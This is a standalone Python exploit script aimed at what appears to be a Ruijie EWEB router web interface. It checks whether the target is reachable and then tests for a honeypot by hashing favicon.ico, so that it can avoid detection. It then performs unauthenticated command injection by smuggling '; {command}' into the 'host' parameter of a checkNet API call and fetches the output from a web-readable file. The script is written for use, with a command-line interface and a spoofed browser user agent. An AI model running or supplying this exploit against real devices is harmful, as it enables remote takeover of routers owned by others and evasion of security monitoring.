#!/usr/bin/python3

import hashlib
import argparse
import requests

from typing import Tuple

def get(url:str, headers:dict) -> object:

    try:
        response = requests.get(url, headers=headers, timeout=30)
    except requests.exceptions.RequestException:
        return None

    return response

def check(host:str, port:int, useragent:str) -> bool:

    headers = {'User-Agent': useragent}

    url = f"http://{host}:{port}/e/index.htm"

    response = get(url, headers)
    if not response:
        return False

    if response.status_code != 200:
        return False

    return True

def is_honeypot(host:str, port:int, useragent:str) -> bool:

    headers = {'User-Agent': useragent}

    response = get(f"http://{host}:{port}/cgi-bin/luci", headers)
    if not response:
        print("luci")
        return True

    if response.status_code != 200:
        print("luci - status code")
        return True

    needle = '<link rel="shortcut icon" href="/luci-static/eweb-'
    index = response.text.find(needle)
    if index == -1:
        print("eweb")
        return True

    bs = response.text[index+len(needle):index+len(needle)+3]
    response = get(f"http://{host}:{port}/luci-static/eweb-{bs}/favicon.ico", headers)
    if not response:
        print("response")
        return True

    if response.status_code != 200:
        print("response - status code")
        return True

    # if not 'Server' in response.headers:
    #     print("Can't find 'Server' in headers.")
    #     return True

    # if not 'Rehttpd' in response.headers['Server']:
    #     print("Invalid Server.")
    #     return True

    if hashlib.md5(response.content).hexdigest() != '6325f774ae8721fa62d2d688380f1248':
        print("Invalid favicon.ico.")
        return True

    return False

def exploit(host:str, port:int, useragent:str, command:str) -> Tuple[bool, str]:

    headers = {'User-Agent': useragent}

    url = f"http://{host}:{port}/cgi-bin/luci/api/auth"

    data = {
        'method': 'checkNet',
        'params': {
            'host': f"; {command} > /www/e/out #"
        }
    }

    try:
        response = requests.post(url, headers=headers, json=data, timeout=10)
    except requests.exceptions.RequestException:
        return (False, "")

    if response.status_code != 200:
        return (False, "")

    url = f"http://{host}:{port}/e/out"

    try:
        response = requests.get(url, headers=headers, timeout=10)
    except requests.exceptions.RequestException:
        return (True, "")

    if response.status_code != 200:
        return (True, "")

    return (True, response.text)

def main(args):
    
    if not args.force:

        if not check(args.host, args.port, args.user_agent):
            print("Invalid target.")
            return -1

        if is_honeypot(args.host, args.port, args.user_agent):
            print("Maybe honeypot?")
            return -1

    status, data = exploit(args.host, args.port, args.user_agent, args.command)
    if not status:
        print("Failed.")
        return -1

    print(data)

if __name__ == '__main__':

    parser = argparse.ArgumentParser()

    parser.add_argument("-u", "--user-agent", type=str, default="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36")
    parser.add_argument("-f", "--force", action='store_true')
    parser.add_argument("host", type=str)
    parser.add_argument("port", type=int)
    parser.add_argument("command", type=str)

    args = parser.parse_args()
    ec = main(args)
    exit(ec)